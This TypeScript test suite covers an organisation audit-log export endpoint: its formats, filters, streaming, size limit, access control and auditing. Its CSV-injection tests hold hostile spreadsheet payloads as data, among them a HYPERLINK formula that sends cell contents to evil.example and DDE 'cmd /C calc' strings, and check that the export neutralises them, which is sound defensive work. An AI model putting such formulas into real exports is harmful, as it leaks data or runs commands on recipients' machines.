/**
 * Phase 10 (W2): `GET /orgs/:orgId/audit-log/export` — formats, filters, streaming across batches,
 * CSV-injection neutralisation, size cap, authorization and auditing of the export itself.
 */
import request from 'supertest';
import { afterAll, beforeEach, describe, expect, it } from 'vitest';
import { AUDIT_EXPORT_COLUMNS, AUDIT_EXPORT_MAX_ROWS } from '@loose/shared';
import { csvCell, csvLine } from '../src/services/governance/auditExport';
import {
  addMember,
  createOrg,
  expectError,
  login,
  makeApp,
  resetDb,
  testPrisma,
  type Client,
} from './helpers';
import { legacyAuditRow, withoutAuditTriggers } from './auditFixtures';

const prisma = testPrisma();
const { app, ctx } = makeApp();

afterAll(async () => {
  await ctx.jobs.onIdle();
  await prisma.$disconnect();
});

beforeEach(async () => {
  await ctx.jobs.onIdle();
  await resetDb(prisma);
});

/** Minimal RFC 4180 parser (quoted fields, doubled quotes, CRLF/LF inside quotes). */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;
    if (quoted) {
      if (c === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i++;
        } else quoted = false;
      } else field += c;
    } else if (c === '"') quoted = true;
    else if (c === ',') {
      row.push(field);
      field = '';
    } else if (c === '\r' && text[i + 1] === '\n') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
      i++;
    } else field += c;
  }
  if (field !== '' || row.length > 0) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

async function download(client: Client, url: string) {
  const res = await client
    .get(url)
    .buffer(true)
    .parse((r, cb) => {
      const chunks: Buffer[] = [];
      r.on('data', (c: Buffer) => chunks.push(c));
      r.on('end', () => cb(null, Buffer.concat(chunks).toString('utf8')));
    });
  return { res, text: typeof res.body === 'string' ? res.body : '' };
}

async function setup() {
  const owner = await login(app, 'owner@example.com', 'Olivia Owner');
  const org = await createOrg(owner, 'Export Org');
  const admin = await login(app, 'admin@example.com');
  await addMember(org.id, admin.user.id, 'ADMIN');
  const member = await login(app, 'member@example.com');
  await addMember(org.id, member.user.id, 'MEMBER');
  const url = (qs = '') => `/api/v1/orgs/${org.id}/audit-log/export${qs}`;
  return { owner, admin, member, org, url };
}

describe('csv cells', () => {
  it('neutralises formula starters and quotes per RFC 4180', () => {
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('+1')).toBe("'+1");
    expect(csvCell('-1')).toBe("'-1");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\tx')).toBe("'\tx");
    expect(csvCell('\rx')).toBe(`"'\rx"`);
    expect(csvCell('plain')).toBe('plain');
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
    expect(csvCell('=a,"b"')).toBe(`"'=a,""b"""`);
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    expect(csvCell(7)).toBe('7');
    expect(csvCell({ a: 1 })).toBe('"{""a"":1}"');
    expect(csvLine(['a', 1, null])).toBe('a,1,\r\n');
  });
});

describe('formats and content', () => {
  it('exports JSON Lines by default, oldest first, with chain fields and the actor email', async () => {
    const { owner, org, url } = await setup();
    await ctx.audit.record({
      orgId: org.id,
      actorId: owner.user.id,
      action: 'policy.update',
      target: 'p1',
      meta: { a: 1 },
      ip: '203.0.113.9',
    });
    const { res, text } = await download(owner, url());
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toBe('application/x-ndjson; charset=utf-8');
    expect(res.headers['content-disposition']).toMatch(
      /^attachment; filename="audit-export-org-\d{4}-\d{2}-\d{2}\.jsonl"$/,
    );
    expect(res.headers['cache-control']).toBe('no-store');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    const lines = text
      .trim()
      .split('\n')
      .map((l) => JSON.parse(l) as Record<string, unknown>);
    expect(lines.length).toBeGreaterThanOrEqual(3);
    for (const l of lines) expect(Object.keys(l)).toEqual([...AUDIT_EXPORT_COLUMNS]);
    const times = lines.map((l) => String(l.createdAt));
    expect([...times].sort()).toEqual(times);
    const row = lines.find((l) => l.action === 'policy.update')!;
    expect(row).toMatchObject({
      orgId: org.id,
      actorId: owner.user.id,
      actorEmail: 'owner@example.com',
      target: 'p1',
      ip: '203.0.113.9',
      meta: { a: 1 },
      chain: org.id,
    });
    expect(row.hash).toMatch(/^[0-9a-f]{64}$/);
    expect(typeof row.seq).toBe('number');
  });

  it('exports CSV with a header row and one record per entry', async () => {
    const { owner, org, url } = await setup();
    await ctx.audit.record({
      orgId: org.id,
      actorId: owner.user.id,
      action: 'policy.update',
      meta: { a: 1 },
    });
    const { res, text } = await download(owner, url('?format=csv'));
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toBe('text/csv; charset=utf-8');
    expect(res.headers['content-disposition']).toMatch(/\.csv"$/);
    const rows = parseCsv(text);
    expect(rows[0]).toEqual([...AUDIT_EXPORT_COLUMNS]);
    const total = await prisma.auditLog.count({ where: { orgId: org.id } });
    expect(rows).toHaveLength(total + 1);
    expect(new Set(rows.map((r) => r.length))).toEqual(new Set([AUDIT_EXPORT_COLUMNS.length]));
    const metaCol = AUDIT_EXPORT_COLUMNS.indexOf('meta');
    const policy = rows.find((r) => r[AUDIT_EXPORT_COLUMNS.indexOf('action')] === 'policy.update')!;
    expect(JSON.parse(policy[metaCol]!)).toEqual({ a: 1 });
  });

  it('rejects unknown formats and malformed filters (LSE-VAL-001)', async () => {
    const { owner, url } = await setup();
    expectError(await owner.get(url('?format=xml')), 'LSE-VAL-001', 400);
    expectError(await owner.get(url('?from=yesterday')), 'LSE-VAL-001', 400);
    expectError(await owner.get(url('?actionPrefix=Bad%20Prefix')), 'LSE-VAL-001', 400);
    expectError(await owner.get(url('?action=not.an.action')), 'LSE-VAL-001', 400);
  });

  it('streams more rows than one batch, complete and in order', async () => {
    const { owner, org, url } = await setup();
    await withoutAuditTriggers(
      prisma,
      (tx) => tx.$executeRaw`
      INSERT INTO "AuditLog" ("id", "orgId", "action", "target", "createdAt", "updatedAt")
      SELECT 'bulk-' || lpad(g::text, 5, '0'), ${org.id}, 'org.update', 'row-' || g,
             TIMESTAMP '2026-01-01 00:00:00' + (g || ' seconds')::interval, now()
      FROM generate_series(1, 1234) AS g`,
    );
    const { res, text } = await download(
      owner,
      url('?actionPrefix=org.&from=2026-01-01T00:00:00Z'),
    );
    expect(res.status).toBe(200);
    const rows = text
      .trim()
      .split('\n')
      .map((l) => JSON.parse(l) as { target: string; id: string });
    const bulk = rows.filter((r) => r.id.startsWith('bulk-'));
    expect(bulk).toHaveLength(1234);
    expect(bulk.map((r) => r.target)).toEqual(
      Array.from({ length: 1234 }, (_, i) => `row-${i + 1}`),
    );
    expect(new Set(rows.map((r) => r.id)).size).toBe(rows.length); // no duplicates across batches
  });
});

describe('filters', () => {
  async function seed() {
    const s = await setup();
    const at = (d: string) => new Date(`${d}T12:00:00.000Z`);
    const row = (data: { action: string; actorId?: string; createdAt: Date; target?: string }) =>
      legacyAuditRow(prisma, { orgId: s.org.id, ...data });
    await row({
      action: 'auth.sign_in',
      actorId: s.admin.user.id,
      createdAt: at('2026-02-01'),
      target: 'a1',
    });
    await row({
      action: 'session.create',
      actorId: s.member.user.id,
      createdAt: at('2026-02-10'),
      target: 'a2',
    });
    await row({
      action: 'session.stop',
      actorId: s.member.user.id,
      createdAt: at('2026-02-20'),
      target: 'a3',
    });
    await row({
      action: 'policy.update',
      actorId: s.admin.user.id,
      createdAt: at('2026-03-01'),
      target: 'a4',
    });
    const other = await createOrg(await login(app), 'Other Org');
    await legacyAuditRow(prisma, {
      orgId: other.id,
      action: 'session.create',
      createdAt: at('2026-02-11'),
      target: 'foreign',
    });
    return s;
  }
  const targets = (text: string) =>
    text
      .trim()
      .split('\n')
      .map((l) => (JSON.parse(l) as { target: string | null }).target)
      .filter((t): t is string => Boolean(t?.match(/^a\d$|^foreign$/)));

  it('filters by action, action prefix, actor and date range, combined with AND', async () => {
    const { owner, admin, member, url } = await seed();
    expect(targets((await download(owner, url('?action=session.stop'))).text)).toEqual(['a3']);
    expect(targets((await download(owner, url('?actionPrefix=session.'))).text)).toEqual([
      'a2',
      'a3',
    ]);
    expect(targets((await download(owner, url(`?actorId=${admin.user.id}`))).text)).toEqual([
      'a1',
      'a4',
    ]);
    expect(
      targets(
        (await download(owner, url('?from=2026-02-05T00:00:00Z&to=2026-02-25T00:00:00Z'))).text,
      ),
    ).toEqual(['a2', 'a3']);
    expect(
      targets(
        (
          await download(
            owner,
            url(`?actionPrefix=session.&actorId=${member.user.id}&to=2026-02-15T00:00:00Z`),
          )
        ).text,
      ),
    ).toEqual(['a2']);
    expect(targets((await download(owner, url('?action=policy.delete'))).text)).toEqual([]);
  });

  it('never includes another org', async () => {
    const { owner, url } = await seed();
    const all = targets((await download(owner, url())).text);
    expect(all).toEqual(['a1', 'a2', 'a3', 'a4']);
    expect(all).not.toContain('foreign');
  });

  it('the same filters narrow the JSON list endpoint', async () => {
    const { owner, org } = await seed();
    const res = await owner.get(
      `/api/v1/orgs/${org.id}/audit-log?actionPrefix=session.&from=2026-02-05T00:00:00Z&limit=10`,
    );
    expect(res.status).toBe(200);
    expect((res.body.data as { target: string }[]).map((e) => e.target).sort()).toEqual([
      'a2',
      'a3',
    ]);
  });
});

describe('CSV injection', () => {
  it('prefixes every dangerous cell so spreadsheets cannot execute it', async () => {
    const { owner, org, url } = await setup();
    const payloads = [
      '=HYPERLINK("http://evil.example/?x="&A1,"click")',
      '+1+1',
      '-2+3',
      "@SUM(1+1)*cmd|' /C calc'!A0",
      '\t=1+1',
      '\r=1+1',
      'multi\nline, "quoted", and =safe-in-the-middle',
    ];
    for (const target of payloads) {
      await ctx.audit.record({
        orgId: org.id,
        actorId: owner.user.id,
        action: 'org.update',
        target,
      });
    }
    const { text } = await download(owner, url('?format=csv&action=org.update'));
    const rows = parseCsv(text);
    const targetCol = AUDIT_EXPORT_COLUMNS.indexOf('target');
    const cells = rows.slice(1).map((r) => r[targetCol]!);
    expect(cells).toHaveLength(payloads.length);
    for (const cell of cells) expect(cell).not.toMatch(/^[=+\-@\t\r]/);
    expect(cells[0]).toBe(`'${payloads[0]}`);
    expect(cells[1]).toBe("'+1+1");
    expect(cells[2]).toBe("'-2+3");
    expect(cells[3]).toBe(`'${payloads[3]}`);
    expect(cells[4]).toBe(`'${payloads[4]}`);
    expect(cells[5]).toBe(`'${payloads[5]}`);
    expect(cells[6]).toBe(payloads[6]); // a formula character in the middle is harmless
    // every cell of every row, not only `target`
    for (const r of rows.slice(1)) for (const c of r) expect(c).not.toMatch(/^[=+\-@\t\r]/);
  });

  it('JSON Lines keeps the exact value (it is not a spreadsheet format)', async () => {
    const { owner, org, url } = await setup();
    await ctx.audit.record({
      orgId: org.id,
      actorId: owner.user.id,
      action: 'org.update',
      target: "=cmd|'/c calc'!A1",
      meta: { name: '=1+1' },
    });
    const jsonl = (await download(owner, url('?action=org.update'))).text;
    expect(JSON.parse(jsonl.trim().split('\n')[0]!).target).toBe("=cmd|'/c calc'!A1");
  });
});

describe('limits, authorization and auditing', () => {
  it('refuses oversized exports before streaming (LSE-VAL-002) and accepts them once narrowed', async () => {
    const { owner, org, url } = await setup();
    await withoutAuditTriggers(
      prisma,
      (tx) => tx.$executeRaw`
      INSERT INTO "AuditLog" ("id", "orgId", "action", "createdAt", "updatedAt")
      SELECT 'big-' || g, ${org.id}, 'org.update',
             TIMESTAMP '2020-01-01 00:00:00' + (g || ' seconds')::interval, now()
      FROM generate_series(1, ${AUDIT_EXPORT_MAX_ROWS + 1}) AS g`,
    );
    const res = await owner.get(url());
    expectError(res, 'LSE-VAL-002', 413);
    expect(res.headers['content-disposition']).toBeUndefined();
    // narrowing the date range makes it exportable
    const narrow = await download(owner, url('?from=2021-01-01T00:00:00Z'));
    expect(narrow.res.status).toBe(200);
    // a refused export is not recorded as an export
    expect(await prisma.auditLog.count({ where: { orgId: org.id, action: 'audit.export' } })).toBe(
      1,
    );
  }, 60_000);

  it('is ADMIN+ and cookie-session only', async () => {
    const { owner, admin, member, org, url } = await setup();
    expect((await download(admin, url())).res.status).toBe(200);
    expectError(await member.get(url()), 'LSE-ORG-002', 403);
    const stranger = await login(app);
    expectError(await stranger.get(url()), 'LSE-ORG-001', 403);
    expectError(await request(app).get(url()), 'LSE-AUTH-001', 401);

    // an API token — even with org:read — cannot export the audit log
    const minted = await owner.post('/api/v1/users/me/tokens', {
      orgId: org.id,
      name: 'ci',
      scopes: ['org:read'],
    });
    expect(minted.status).toBe(201);
    expectError(
      await request(app)
        .get(url())
        .set('Authorization', `Bearer ${minted.body.data.token as string}`),
      'LSE-AUTH-001',
      401,
    );
  });

  it('records audit.export with the filters and row count, attributed to the exporter', async () => {
    const { admin, org, url } = await setup();
    await download(admin, url('?format=csv&actionPrefix=org.&from=2020-01-01T00:00:00Z'));
    const entry = await prisma.auditLog.findFirstOrThrow({
      where: { orgId: org.id, action: 'audit.export' },
    });
    expect(entry.actorId).toBe(admin.user.id);
    expect(entry.meta).toMatchObject({
      format: 'csv',
      filters: { actionPrefix: 'org.', from: '2020-01-01T00:00:00Z', action: null },
    });
    expect((entry.meta as { rows: number }).rows).toBeGreaterThanOrEqual(1);
  });

  it('is switched off by the audit_export feature flag (LSE-SYS-007)', async () => {
    const off = makeApp({ env: { FEATURE_FLAGS: 'audit_export=off' } });
    const owner = await login(off.app);
    const org = await createOrg(owner);
    expectError(await owner.get(`/api/v1/orgs/${org.id}/audit-log/export`), 'LSE-SYS-007', 503);
    await off.ctx.jobs.onIdle();
  });
});
